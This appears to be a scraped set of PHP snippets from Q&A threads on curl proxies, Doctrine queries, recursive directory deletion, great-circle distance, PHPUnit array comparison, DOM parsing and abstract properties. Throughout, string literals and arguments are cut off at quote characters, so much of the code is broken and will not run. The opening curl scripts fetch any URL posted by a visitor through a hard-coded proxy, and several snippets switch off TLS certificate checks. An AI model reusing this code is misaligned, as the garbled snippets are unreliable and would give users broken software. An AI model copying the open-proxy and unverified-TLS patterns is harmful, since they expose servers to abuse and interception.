<? $proxy = "66.96.200.39:80"; $proxy = explode( $url = "$_POST[1]"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy[0]); curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]); curl_setopt($ch, CURLOPT_HEADER, 1); $exec = curl_exec($ch); echo curl_error($ch); print_r(curl_getinfo($ch)); echo $exec; ?>
<? $url = $_POST[ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,$url); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0); curl_setopt($ch, CURLOPT_PROXY, curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, curl_setopt ($ch, CURLOPT_HEADER, 1); curl_exec ($ch); $curl_scraped_page = curl_exec($ch); curl_close($ch); echo $curl_scraped_page; ?>
$url = $proxy = $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,$url); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 1); $curl_scraped_page = curl_exec($ch); curl_close($ch); echo $curl_scraped_page;
$url = $proxy = $proxyauth = $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 1); $curl_scraped_page = curl_exec($ch); curl_close($ch); echo $curl_scraped_page;
function get_page($url){ global $proxy; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 200); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_MAXREDIRS, 2); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7"); curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt"); curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_ENCODING, "gzip"); $data = curl_exec($ch); curl_close($ch); return $data; }
$method = $_SERVER[ switch ($method) { case return $this->doGet($request, $object); case return $this->doPost($request, $object); case return $this->doPut($request, $object); case return $this->doDelete($request, $object); default: return $this->onBadRequest(); }
Message: Invalid parameter number: number of bound variables does not match number of tokens
public function getCount($ids, $outcome) { if (!is_array($ids)) { $ids = array($ids); } $qb = $this->getEntityManager()->createQueryBuilder(); $qb->add( ->add( if ($outcome === $qb->add( } if ($outcome === $qb->add( } $qb->setParameter(1, $ids); $query = $qb->getQuery(); return $query->getSingleScalarResult(); }
q = SELECT COUNT(r.id) FROM \My\Entity\Rating r WHERE r.winner IN(
$ids = [1, 2, 3, 4]; $repo = $this->getDoctrine()->getRepository( $result = $repo->findBy([ ]);
$qb->andWhere( $qb->setParameter( \Doctrine\DBAL\Connection::PARAM_INT_ARRAY);
$em->createQuery(“SELECT users FROM Entities\User users WHERE users.id IN (:userids)”) ->setParameters(array(‘userids’ => $userIds));
$qb->andWhere($qb->expr()->in( User::USER_ROLE_ID_ADVERTISER, User::USER_ROLE_ID_MANAGER, ]));
$q = dataTable::getInstance() ->createQuery() ->where("name = ?", ->andWhereIn("image_id", $ids) ->orderBy( ->limit(100); $q->execute();
<div> some html code .... <a href="<?php $tpl->link;?>">some link to test</a> </div> dump $tpl like this: <pre><?php var_dump($tpl); ?></pre>
$logFilePath = ob_start(); if (file_exists($logFilePath)) { include($logFilePath); } $currentTime = date(DATE_RSS); echo "\n\n$currentTime - [log statement here]"; $logFile = fopen($logFilePath, fwrite($logFile, ob_get_contents()); fclose($logFile); ob_end_flush();
<?php { AddLog("anypage.php","reason",ERR_ERROR); } ?>
AddLog("anypage.php","string: ".$string,ERR_DEBUG_LOW);
array_walk($yourArray, function(&$value) { $value = strtolower($value); });
foreach($yourArray as &$value) $value = strtolower($value);
function array_change_value_case($array, $case = CASE_LOWER){ if ( ! is_array($array)) return false; foreach ($array as $key => &$value){ if (is_array($value)) call_user_func_array(__function__, array (&$value, $case ) ) ; else $array[$key] = ($case == CASE_UPPER ) ? strtoupper($array[$key]) : strtolower($array[$key]); } return $array; } $arrays = array ( 1 => 5=> array( $change_case = array_change_value_case($arrays, CASE_UPPER); echo "<pre>"; print_r($change_case);
Array ( [1] => one [2] => two [3] => three [FOUR] => Array ( [a] => ahmed [b] => basem [c] => continue ) [5] => five [6] => Array ( [0] => abcdef ) )
function nestedLowercase($value) { if (is_array($value)) { return array_map( } return strtolower($value); }
for($i=0; $i < count($array1); $i++) { $array1[$i] = strtolower($array1[$i]); }
/** * Change array values case recursively (supports utf8/multibyte) * @param array $array The array * @param int $case Case to transform (\CASE_LOWER | \CASE_UPPER) * @return array Final array */ function changeValuesCase ( array $array, $case = \CASE_LOWER ) : array { if ( !\is_array ($array) ) { return []; } /** @var integer $theCase */ $theCase = ($case === \CASE_LOWER) ? \MB_CASE_LOWER : \MB_CASE_UPPER; foreach ( $array as $key => $value ) { $array[$key] = \is_array ($value) ? changeValuesCase ($value, $case) : \mb_convert_case($array[$key], $theCase, } return $array; }
$food = [ ], ]; $newArray = changeValuesCase ($food, \CASE_UPPER);
[ 0 => 1 => ] 0 => 1 => 2 => 3 => 4 => ] 0 => 1 => 2 => 3 => ] 0 => 1 => 2 => 3 => ] ] 0 => 1 => 2 => ] ]
function rrmdir($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "." && $object != "..") { if (is_dir($dir."/".$object)) rrmdir($dir."/".$object); else unlink($dir."/".$object); } } rmdir($dir); } }
$files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST ); foreach ($files as $fileinfo) { $todo = ($fileinfo->isDir() ? $todo($fileinfo->getRealPath()); } rmdir($dir);
function recurseRmdir($dir) { $files = array_diff(scandir($dir), array( foreach ($files as $file) { (is_dir("$dir/$file")) ? recurseRmdir("$dir/$file") : unlink("$dir/$file"); } return rmdir($dir); }
<?php use RecursiveDirectoryIterator; use RecursiveIteratorIterator; use SplFileInfo; /** * Recursively delete a directory and all of it * Consistent with `rmdir()` and `unlink()`, an E_WARNING level error will be generated on failure. * * @param string $source absolute path to directory or file to delete. * @param bool $removeOnlyChildren set to true will only remove content inside directory. * * @return bool true on success; false on failure */ function rrmdir($source, $removeOnlyChildren = false) { if(empty($source) || file_exists($source) === false) { return false; } if(is_file($source) || is_link($source)) { return unlink($source); } $files = new RecursiveIteratorIterator ( new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST ); foreach($files as $fileinfo) { if($fileinfo->isDir()) { if(rrmdir($fileinfo->getRealPath()) === false) { return false; } } else { if(unlink($fileinfo->getRealPath()) === false) { return false; } } } if($removeOnlyChildren === false) { return rmdir($source); } return true; }
function deleteNonEmptyDir($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "." && $object != "..") { if (filetype($dir . "/" . $object) == "dir") { deleteNonEmptyDir($dir . "/" . $object); } else { unlink($dir . "/" . $object); } } } reset($objects); rmdir($dir); } }
function delete_folder($folder) { $glob = glob($folder); foreach ($glob as $g) { if (!is_dir($g)) { unlink($g); } else { delete_folder("$g/*"); rmdir($g); } } }
function recursive_rmdir($dir) { if( is_dir($dir) ) { $objects = array_diff( scandir($dir), array( foreach ($objects as $object) { $objectPath = $dir."/".$object; if( is_dir($objectPath) ) recursive_rmdir($objectPath); else unlink($objectPath); } rmdir($dir); } }
function unlinkr($dir, $pattern = "*") { $files = glob($dir . "/$pattern"); foreach($files as $file){ if (is_dir($file) and !in_array($file, array( echo "<p>opening directory $file </p>"; unlinkr($file, $pattern); echo "<p> deleting directory $file </p>"; rmdir($file); } else if(is_file($file) and ($file != __FILE__)) { echo "<p>deleting file $file </p>"; unlink($file); } } }
<?php class RMRFiles { function __construct(){ } public function recScan( $mainDir, $allData = array() ) { $hidefiles = array( ".", "..") ; $dirContent = scandir( $mainDir ) ; foreach ( $dirContent as $key => $content ) { $path = $mainDir . if ( ! in_array( $content, $hidefiles ) ) { if ( is_file( $path ) && is_readable( $path ) ) { $allData[ } else if ( is_dir( $path ) && is_readable( $path ) ) { $allData = $this->recScan( $path, $allData ) ; $allData[ } } } return $allData ; } } header("Content-Type: text/plain"); /* Get absolute path of the running script Ex : /home/user/public_html/ */ define( /* The folder where we store cache files Ex: /home/user/public_html/var/cache */ define( $rmrf = new RMRFiles(); print_r($rmrf->recScan(ABPATH.STOREDIR)); ?>
<?php /** * code by Nk (nk.have.a@gmail.com) */ class filesystem { public static function remove($path) { return is_dir($path) ? rmdir($path) : unlink($path); } public static function normalizePath($path) { return $path.(is_dir($path) && !preg_match( } public static function rscandir($dir, $sort = SCANDIR_SORT_ASCENDING) { $results = array(); if(!is_dir($dir)) return $results; $dir = self::normalizePath($dir); $objects = scandir($dir, $sort); foreach($objects as $object) if($object != { if(is_dir($dir.$object)) $results = array_merge($results, self::rscandir($dir.$object, $sort)); else array_push($results, $dir.$object); } array_push($results, $dir); return $results; } public static function rrmdir($dir) { $files = self::rscandir($dir); foreach($files as $file) self::remove($file); return !file_exists($dir); } } ?>
public static function rmdir_recursive($directory, $delete_parent = null) { $files = glob($directory . foreach ($files as $file) { if (is_dir($file)) { self::rmdir_recursive($file, 1); } else { unlink($file); } } if ($delete_parent) { rmdir($directory); } }
function splRm(SplFileInfo $i) { $path = $i->getRealPath(); if ($i->isDir()) { echo rmdir($path); } elseif($i->isFile()) { echo unlink($path); } } function splRrm(SplFileInfo $j) { $path = $j->getRealPath(); if ($j->isDir()) { $rdi = new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS); $rii = new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::CHILD_FIRST); foreach ($rii as $i) { splRm($i); } } splRm($j); } splRrm(new SplFileInfo(__DIR__.
function rmdir_recursive( $dirname ) { /** * FilesystemIterator and SKIP_DOTS */ if ( class_exists( if ( !is_dir( $dirname ) ) { return false; } foreach( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $dirname, FilesystemIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST ) as $path ) { $path->isDir() ? rmdir( $path->getPathname() ) : unlink( $path->getRealPath() ); } return rmdir( $dirname ); } /** * RecursiveDirectoryIterator and SKIP_DOTS */ if ( class_exists( if ( !is_dir( $dirname ) ) { return false; } foreach( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $dirname, RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST ) as $path ) { $path->isDir() ? rmdir( $path->getPathname() ) : unlink( $path->getRealPath() ); } return rmdir( $dirname ); } /** * RecursiveIteratorIterator and RecursiveDirectoryIterator */ if ( class_exists( if ( !is_dir( $dirname ) ) { return false; } foreach( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $dirname ), RecursiveIteratorIterator::CHILD_FIRST ) as $path ) { if ( in_array( $path->getFilename(), array( continue; } $path->isDir() ? rmdir( $path->getPathname() ) : unlink( $path->getRealPath() ); } return rmdir( $dirname ); } /** * Scandir Recursive */ if ( !is_dir( $dirname ) ) { return false; } $objects = scandir( $dirname ); foreach ( $objects as $object ) { if ( $object === continue; } filetype( $dirname . DIRECTORY_SEPARATOR . $object ) === } reset( $objects ); rmdir( $dirname ); return !is_dir( $dirname ); }
delete_all( function delete_all( $item ) { if ( is_dir( $item ) ) { array_map( rmdir( $item ); } else { unlink( $item ); } };
function recursivelyRemoveDirectory($source, $removeOnlyChildren = true) { if (empty($source) || file_exists($source) === false) { throw new Exception("File does not exist: } if (is_file($source) || is_link($source)) { if (false === unlink($source)) { throw new Exception("Cannot delete file } } $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST ); foreach ($files as $fileInfo) { /** @var SplFileInfo $fileInfo */ if ($fileInfo->isDir()) { if ($this->recursivelyRemoveDirectory($fileInfo->getRealPath()) === false) { throw new Exception("Failed to remove directory } if (false === rmdir($fileInfo->getRealPath())) { throw new Exception("Failed to remove empty directory } } else { if (unlink($fileInfo->getRealPath()) === false) { throw new Exception("Failed to remove file } } } if ($removeOnlyChildren === false) { if (false === rmdir($source)) { throw new Exception("Cannot remove directory } } }
function rmDirectory($dir) { foreach(glob($dir . if(is_dir($file)) rrmdir($file); else unlink($file); } rmdir($dir); }
<?php public static function delTree($dir) { $files = array_diff(scandir($dir), array( foreach ($files as $file) { (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); } return rmdir($dir); } ?>
function deltree_cat($folder) { if (is_dir($folder)) { $handle = opendir($folder); while ($subfile = readdir($handle)) { if ($subfile == if (is_file($subfile)) unlink("{$folder}/{$subfile}"); else deltree_cat("{$folder}/{$subfile}"); } closedir($handle); rmdir ($folder); } else { unlink($folder); } }
public function created() { if (!User::isValidRegister(Input::all())) { return Redirect::back()->withInput()->withErrors(User::$errors); } $user = new User; $user->naam = Input::get( $user->wachtwoord = Hash::make(Input::get( $user->save(); return Redirect::to( }
class CoordDistance { public $lat_a = 0; public $lon_a = 0; public $lat_b = 0; public $lon_b = 0; public $measure_unit = public $measure_state = false; public $measure = 0; public $error = public function DistAB() { $delta_lat = $this->lat_b - $this->lat_a ; $delta_lon = $this->lon_b - $this->lon_a ; $earth_radius = 6372.795477598; $alpha = $delta_lat/2; $beta = $delta_lon/2; $a = sin(deg2rad($alpha)) * sin(deg2rad($alpha)) + cos(deg2rad($this->lat_a)) * cos(deg2rad($this->lat_b)) * sin(deg2rad($beta)) * sin(deg2rad($beta)) ; $c = asin(min(1, sqrt($a))); $distance = 2*$earth_radius * $c; $distance = round($distance, 4); $this->measure = $distance; } }
/** * Calculates the great-circle distance between two points, with * the Haversine formula. * @param float $latitudeFrom Latitude of start point in [deg decimal] * @param float $longitudeFrom Longitude of start point in [deg decimal] * @param float $latitudeTo Latitude of target point in [deg decimal] * @param float $longitudeTo Longitude of target point in [deg decimal] * @param float $earthRadius Mean earth radius in [m] * @return float Distance between points in [m] (same as earthRadius) */ function haversineGreatCircleDistance( $latitudeFrom, $longitudeFrom, $latitudeTo, $longitudeTo, $earthRadius = 6371000) { $latFrom = deg2rad($latitudeFrom); $lonFrom = deg2rad($longitudeFrom); $latTo = deg2rad($latitudeTo); $lonTo = deg2rad($longitudeTo); $latDelta = $latTo - $latFrom; $lonDelta = $lonTo - $lonFrom; $angle = 2 * asin(sqrt(pow(sin($latDelta / 2), 2) + cos($latFrom) * cos($latTo) * pow(sin($lonDelta / 2), 2))); return $angle * $earthRadius; }
/** * Calculates the great-circle distance between two points, with * the Vincenty formula. * @param float $latitudeFrom Latitude of start point in [deg decimal] * @param float $longitudeFrom Longitude of start point in [deg decimal] * @param float $latitudeTo Latitude of target point in [deg decimal] * @param float $longitudeTo Longitude of target point in [deg decimal] * @param float $earthRadius Mean earth radius in [m] * @return float Distance between points in [m] (same as earthRadius) */ public static function vincentyGreatCircleDistance( $latitudeFrom, $longitudeFrom, $latitudeTo, $longitudeTo, $earthRadius = 6371000) { $latFrom = deg2rad($latitudeFrom); $lonFrom = deg2rad($longitudeFrom); $latTo = deg2rad($latitudeTo); $lonTo = deg2rad($longitudeTo); $lonDelta = $lonTo - $lonFrom; $a = pow(cos($latTo) * sin($lonDelta), 2) + pow(cos($latFrom) * sin($latTo) - sin($latFrom) * cos($latTo) * cos($lonDelta), 2); $b = sin($latFrom) * sin($latTo) + cos($latFrom) * cos($latTo) * cos($lonDelta); $angle = atan2(sqrt($a), $b); return $angle * $earthRadius; }
function distance($lat1, $lon1, $lat2, $lon2, $unit) { $theta = $lon1 - $lon2; $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta)); $dist = acos($dist); $dist = rad2deg($dist); $miles = $dist * 60 * 1.1515; $unit = strtoupper($unit); if ($unit == "K") { return ($miles * 1.609344); } else if ($unit == "N") { return ($miles * 0.8684); } else { return $miles; } }
echo distance(32.9697, -96.80322, 29.46786, -98.53506, "M") . " Miles<br>"; echo distance(32.9697, -96.80322, 29.46786, -98.53506, "K") . " Kilometers<br>"; echo distance(32.9697, -96.80322, 29.46786, -98.53506, "N") . " Nautical Miles<br>";
/** * Optimized algorithm from http: * * @param float $latitudeFrom * @param float $longitudeFrom * @param float $latitudeTo * @param float $longitudeTo * * @return float [km] */ function codexworldGetDistanceOpt($latitudeFrom, $longitudeFrom, $latitudeTo, $longitudeTo) { $rad = M_PI / 180; $theta = $longitudeFrom - $longitudeTo; $dist = sin($latitudeFrom * $rad) * sin($latitudeTo * $rad) + cos($latitudeFrom * $rad) * cos($latitudeTo * $rad) * cos($theta * $rad); return acos($dist) / $rad * 60 * 1.853; }
Test name Repeats Result Performance codexworld-opt 10000 0.084952 sec +0.00% codexworld 10000 0.104127 sec -22.57% custom 10000 0.107419 sec -26.45% custom2 10000 0.111576 sec -31.34% custom1 10000 0.136691 sec -60.90% vincenty 10000 0.165881 sec -95.26%
$latitudeFrom = $longitudeFrom = $latitudeTo = $longitudeTo = $theta = $longitudeFrom - $longitudeTo; $dist = sin(deg2rad($latitudeFrom)) * sin(deg2rad($latitudeTo)) + cos(deg2rad($latitudeFrom)) * cos(deg2rad($latitudeTo)) * cos(deg2rad($theta)); $dist = acos($dist); $dist = rad2deg($dist); $miles = $dist * 60 * 1.1515; $distance = ($miles * 1.609344).
function circle_distance($lat1, $lon1, $lat2, $lon2) { $rad = M_PI / 180; return acos(sin($lat2*$rad) * sin($lat1*$rad) + cos($lat2*$rad) * cos($lat1*$rad) * cos($lon2*$rad - $lon1*$rad)) * 6371; }
function getDistance($point1_lat, $point1_long, $point2_lat, $point2_long, $unit = $degrees = rad2deg(acos((sin(deg2rad($point1_lat))*sin(deg2rad($point2_lat))) + (cos(deg2rad($point1_lat))*cos(deg2rad($point2_lat))*cos(deg2rad($point1_long-$point2_long))))); switch($unit) { case $distance = $degrees * 111.13384; break; case $distance = $degrees * 69.05482; break; case $distance = $degrees * 59.97662; } return round($distance, $decimals); }
public function DistAB() { $delta_lat = $this->lat_b - $this->lat_a ; $delta_lon = $this->lon_b - $this->lon_a ; $a = pow(sin($delta_lat/2), 2); $a += cos(deg2rad($this->lat_a9)) * cos(deg2rad($this->lat_b9)) * pow(sin(deg2rad($delta_lon/29)), 2); $c = 2 * atan2(sqrt($a), sqrt(1-$a)); $distance = 2 * $earth_radius * $c; $distance = round($distance, 4); $this->measure = $distance; }
$url ="https: $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL,$url); $result=curl_exec($ch); curl_close($ch); $result_array=json_decode($result); print_r($result_array);
N 36°7.2 referencing the Greenwich meridian and Equator parallel (phi) 36.12° = 36° + 7.2 (lambda) -86.67° = 86° + 40.2
/** * Computes the distance between two coordinates. * * Implementation based on reverse engineering of * <code>google.maps.geometry.spherical.computeDistanceBetween()</code>. * * @param float $lat1 Latitude from the first point. * @param float $lng1 Longitude from the first point. * @param float $lat2 Latitude from the second point. * @param float $lng2 Longitude from the second point. * @param float $radius (optional) Radius in meters. * * @return float Distance in meters. */ function computeDistance($lat1, $lng1, $lat2, $lng2, $radius = 6378137) { static $x = M_PI / 180; $lat1 *= $x; $lng1 *= $x; $lat2 *= $x; $lng2 *= $x; $distance = 2 * asin(sqrt(pow(sin(($lat1 - $lat2) / 2), 2) + cos($lat1) * cos($lat2) * pow(sin(($lng1 - $lng2) / 2), 2))); return $distance * $radius; }
function calculateDistanceBetweenTwoPoints($latitudeOne= { if (empty($decimalPoints)) { $decimalPoints = } if (empty($distanceUnit)) { $distanceUnit = } $distanceUnit = strtolower($distanceUnit); $pointDifference = $longitudeOne - $longitudeTwo; $toSin = (sin(deg2rad($latitudeOne)) * sin(deg2rad($latitudeTwo))) + (cos(deg2rad($latitudeOne)) * cos(deg2rad($latitudeTwo)) * cos(deg2rad($pointDifference))); $toAcos = acos($toSin); $toRad2Deg = rad2deg($toAcos); $toMiles = $toRad2Deg * 60 * 1.1515; $toKilometers = $toMiles * 1.609344; $toNauticalMiles = $toMiles * 0.8684; $toMeters = $toKilometers * 1000; $toFeets = $toMiles * 5280; $toYards = $toFeets / 3; switch (strtoupper($distanceUnit)) { case $toMiles = ($round == true ? round($toMiles) : round($toMiles, $decimalPoints)); return $toMiles; break; case $toKilometers = ($round == true ? round($toKilometers) : round($toKilometers, $decimalPoints)); return $toKilometers; break; case $toMeters = ($round == true ? round($toMeters) : round($toMeters, $decimalPoints)); return $toMeters; break; case $toFeets = ($round == true ? round($toFeets) : round($toFeets, $decimalPoints)); return $toFeets; break; case $toYards = ($round == true ? round($toYards) : round($toYards, $decimalPoints)); return $toYards; break; case $toNauticalMiles = ($round == true ? round($toNauticalMiles) : round($toNauticalMiles, $decimalPoints)); return $toNauticalMiles; break; } }
<?php $dir = new DirectoryIterator(dirname(__FILE__)); foreach ($dir as $fileinfo) { if (!$fileinfo->isDot()) { var_dump($fileinfo->getFilename()); } } ?>
<?php $path = "/path/to/files"; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { if ( if ( } closedir($handle); } ?>
<?php $directory = if (! is_dir($directory)) { exit( } $files = array(); foreach (scandir($directory) as $file) { if ( if ( $files[] = $file; } var_dump($files); ?>
$fileSystemIterator = new FilesystemIterator( $entries = array(); foreach ($fileSystemIterator as $fileInfo){ $entries[] = $fileInfo->getFilename(); } var_dump($entries); object(FilesystemIterator)[1] array (size=14) 0 => string 1 => string 2 => string 3 => string 4 => string 5 => string 6 => string 7 => string 8 => string 9 => string 10 => string 11 => string 12 => string 13 => string
$path = "/home/myhome"; $rdi = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::KEY_AS_PATHNAME); foreach (new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::SELF_FIRST) as $file => $info) { echo $file."\n"; }
$entries = []; $d = dir("/"); while (false !== ($entry = $d->read())) { if ($entry[0] == $entries[] = $entry; } $d->close(); sort($entries); print_r($entries);
/** * Determine if two associative arrays are similar * * Both arrays must have the same indexes with identical values * without respect to key ordering * * @param array $a * @param array $b * @return bool */ function arrays_are_similar($a, $b) { if (count(array_diff_assoc($a, $b))) { return false; } foreach($a as $k => $v) { if ($v !== $b[$k]) { return false; } } return true; }
class ArraysTest extends PHPUnit_Framework_TestCase { public function testEquality() { $obj1 = $this->getObject(1); $obj2 = $this->getObject(2); $obj3 = $this->getObject(3); $array1 = [$obj1, $obj2, $obj3]; $array2 = [$obj2, $obj1, $obj3]; $this->assertEquals($array1, $array2, "\$canonicalize = true", 0.0, 10, true); $this->assertEquals($array1, $array2, "Default behaviour"); } private function getObject($value) { $result = new stdclass(); $result->property = $value; return $result; } }
$expected = array("0" => "green", "2" => "red", "5" => "blue", "9" => "pink");
$actual = array("0" => "pink", "1" => "green", "3" => "yellow", "red", "blue");
$this->assertEmpty(array_merge(array_diff($expected, $actual), array_diff($actual, $expected)));
$this->assertSame(array_diff($expected, $actual), array_diff($actual, $expected));
$arr = array(23, 42, 108); $exp = array(42, 23, 108); sort($arr); sort($exp); $this->assertEquals(json_encode($exp), json_encode($arr));
protected function assertEqualsArrays($expected, $actual, $message) { $this->assertTrue(count($expected) == count(array_intersect($expected, $actual)), $message); }
protected function assertEqualsArrays($expected, $actual, $message) { sort($expected); sort($actual); $this->assertEquals($expected, $actual, $message); }
$a1 = array(1, 2, 3); $a2 = array(3, 2, 1); $this->assertEquals(0, count(array_diff($a1, $a2)) + count(array_diff($a2, $a1)));
$this->assertEquals(0, count(array_diff($a1, $a2))); $this->assertEquals(0, count(array_diff($a2, $a1)));
/** * Assert that two arrays are equal. This helper method will sort the two arrays before comparing them if * necessary. This only works for one-dimensional arrays, if you need multi-dimension support, you will * have to iterate through the dimensions yourself. * @param array $expected the expected array * @param array $actual the actual array * @param bool $regard_order whether or not array elements may appear in any order, default is false * @param bool $check_keys whether or not to check the keys in an associative array */ protected function assertArraysEqual(array $expected, array $actual, $regard_order = false, $check_keys = true) { $this->assertEquals(count($expected), count($actual), if (!$regard_order) { if ($check_keys) { $this->assertTrue(ksort($expected), $this->assertTrue(ksort($actual), } else { $this->assertTrue(sort($expected), $this->assertTrue(sort($actual), } } $this->assertEquals($expected, $actual); }
/** * Assert Array structures are the same * * @param array $expected Expected Array * @param array $actual Actual Array * @param string|null $msg Message to output on failure * * @return bool */ public function assertArrayStructure($expected, $actual, $msg = ksort($expected); ksort($actual); $this->assertSame($expected, $actual, $msg); }
asort($foo); asort($bar); $this->assertEquals($foo, $bar);
public function assertArrayEquals($array1, $array2, $rootPath = array()) { foreach ($array1 as $key => $value) { $this->assertArrayHasKey($key, $array2); if (isset($array2[$key])) { $keyPath = $rootPath; $keyPath[] = $key; if (is_array($value)) { $this->assertArrayEquals($value, $array2[$key], $keyPath); } else { $this->assertEquals($value, $array2[$key], "Failed asserting that `".$array2[$key]."` matches expected `$value` for path `".implode(" > ", $keyPath)."`."); } } } }
$this->assertArrayEquals($array1, $array2, array("/"));
/** * Returns all keys from arrays with any number of levels * @param array * @return array */ protected function getAllArrayKeys($array) { $keys = array(); foreach ($array as $key => $element) { $keys[] = $key; if (is_array($array[$key])) { $keys = array_merge($keys, $this->getAllArrayKeys($array[$key])); } } return $keys; }
$expectedKeys = $this->getAllArrayKeys($expectedData); $actualKeys = $this->getAllArrayKeys($actualData); $this->assertEmpty(array_diff($expectedKeys, $actualKeys));
$this->assertEquals(array_values($arrayOne), array_values($arrayTwo));
$dom = new DOMDocument; $dom->loadHTML($html); foreach ($dom->getElementsByTagName( echo $dom->saveHtml($node), PHP_EOL; }
$dom = new DOMDocument; $dom->loadHTML($html); $xpath = new DOMXPath($dom); $nodes = $xpath->query( foreach($nodes as $href) { echo $href->nodeValue; $href->nodeValue = $href->parentNode->removeAttribute( }
array(3) { [0]=> string(37) "<a title="this" href="that">what?</a>" [1]=> string(1) """ [2]=> string(4) "that" }
"<a.*?href\s*=\s*[ <?php $str = $res = array(); preg_match_all("/<a.*?href\s*=\s*[ var_dump($res); ?>
$ php test.php array(2) { [0]=> array(1) { [0]=> string(27) "<a title="this" href="that"" } [1]=> array(1) { [0]=> string(4) "that" } }
abstract class Foo_Abstract { abstract public $tablename; } class Foo extends Foo_Abstract { public $tablename = }
class Foo_Abstract { public final function __construct( ) { if(!isset($this->tablename)) throw new LogicException(get_class($this) . } }
abstract class Foo_Abstract { abstract public function get_tablename(); } class Foo extends Foo_Abstract { protected $tablename = public function get_tablename() { return $this->tablename; } }
abstract class Father { public $name; abstract protected function setName(); public function __construct() { $this->setName(); } } class Son extends Father { protected function setName() { $this->name = "son"; } function __construct(){ parent::__construct(); } }
abstract class AbstractFoo { public $bar; public function __construct() { $this->bar = static::BAR; } } class Foo extends AbstractFoo { } $foo = new Foo; echo $foo->bar;
abstract class A { abstract protected static $prop; } class B extends A { protected static $prop = } class C extends A { }
abstract class A { public static final function getProp() { return static::$prop; } } class B extends A { protected static $prop = } class C extends A { }
class D extends A { public static function getProp() { } } D::getProp();
abstract class Foo_Abstract { abstract public $tablename; } class Foo extends Foo_Abstract { public $tablename = }
class Table { private $name; public function __construct(string $name) { $this->name = $name; } public function name(): string { return $this->name; } }
final class UsersTable extends Table { public function __construct() { parent::__construct( } }
abstract class Foo_Abstract { abstract protected function getTablename(); public function showTableName() { echo } } class Foo extends Foo_Abstract { protected function getTablename() { return } }
<?php abstract class FooBase { abstract public function FooProp(): string; abstract public function BarProp(): BarClass; public function foo() { return $this->FooProp(); } public function bar() { return $this->BarProp()->name(); } } class BarClass { public function name() { return } } class FooClass extends FooBase { public function FooProp(): string { return } public function BarProp(): BarClass { return new BarClass(); } } $test = new FooClass(); echo $test->foo() . PHP_EOL; echo $test->bar() . PHP_EOL;
function returnHello(): string? { return } function returnHello(): string|null { return }
function nullOrString(int $foo) : ?string { return $foo%2 ? "odd" : null; }
public function returnStringOrNull(?array $optionalArray) : ?string { if ($optionalArray) { return implode( } return null; }
public function returnStringOrNull(array|null $optionalArray) : string|null { if ($optionalArray) { return implode( } return null; }
public function returnStringOrNull( array $optionalArray = null) { if ($optionalArray) { return implode( } }
public function returnStringOrNull( array $optionalArray = null) : string { if ($optionalArray) { return implode( } return } $string = $x->returnStringOrNull(); if (!$string) { $string = $x->returnStringOrNull(range(1, 10)); }
public function getName(): ?string { return $this->name; }
composer create-project symfony/framework-standard-edition myproject/ 2.2.1
composer create-project symfony/framework-standard-edition mynewerproject/ 2.3.0-RC1
